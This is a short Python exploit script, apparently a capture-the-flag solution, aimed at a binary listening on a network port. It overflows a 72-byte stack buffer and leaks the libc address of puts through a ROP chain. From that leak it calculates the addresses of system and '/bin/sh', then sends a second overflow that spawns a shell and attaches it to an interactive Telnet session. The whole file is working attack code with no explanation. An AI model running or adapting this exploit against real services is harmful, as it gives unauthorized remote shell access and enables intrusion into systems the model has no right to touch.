# -*- coding: utf-8 -*-
#!/usr/bin/env python

from socket import *
from telnetlib import Telnet
from time import time, sleep
from sys import argv
from struct import pack, unpack

def read_until(s, c):
    ret = ""
    while 1:
        ret += s.recv(1)
        if ret.endswith(c):
            return ret

def p(x):
    return pack("<Q", x)

def u(x):
    return unpack("<Q", x)[0]

def interact(s):
    print("[*] connect to remote")
    t = Telnet()
    t.sock = s
    t.interact()

if len(argv) >= 2 and argv[1] == "r":
    print("[*] connetc to remote")
    HOST = argv[2]
    PORT = int(argv[3])

else:
    print("[*] connect to local")
    HOST = "localhost"
    PORT = 9999

def main():
    POP_RDI = 0x400753
    PUTS_PLT = 0x400520
    PUTS_GOT = 0x601018
    MAIN_ADDR = 0x4006a9

    PUTS_OFF = 0x6f690
    SYSTEM_OFF = 0x45390
    BINSH_OFF = 0x18cd57
    EXIT_OFF = 0x3a030
    
    payload = "A" * 72
    payload += p(POP_RDI)
    payload += p(PUTS_GOT)
    payload += p(PUTS_PLT)
    payload += p(MAIN_ADDR)

    s = socket(AF_INET, SOCK_STREAM)
    s.connect((HOST, PORT))

    _ = read_until(s, "Local Buffer >>")
    s.sendall(payload + "\n")
    _ = read_until(s, "Have a nice pwn!!\n")
    puts_addr = hex(u(read_until(s, "\n") + "A"))
    #print puts_addr

    tmp = puts_addr[0:2]
    #print tmp
    addr = puts_addr[-12:]
    #print addr
    puts_addr = int(tmp+addr, 16)
    #print puts_addr

    libc_addr = puts_addr - PUTS_OFF
    system_addr = libc_addr + SYSTEM_OFF
    binsh_addr = libc_addr + BINSH_OFF
    exit_addr = libc_addr + EXIT_OFF
    
    payload = "B" * 72
    payload += p(POP_RDI)
    payload += p(binsh_addr)
    payload += p(system_addr)
    payload += "BBBBBBBB"

    _ = read_until(s, "Local Buffer >>")
    s.sendall(payload + "\n")

    interact(s)
    
if __name__ == "__main__":
    main()
    
        

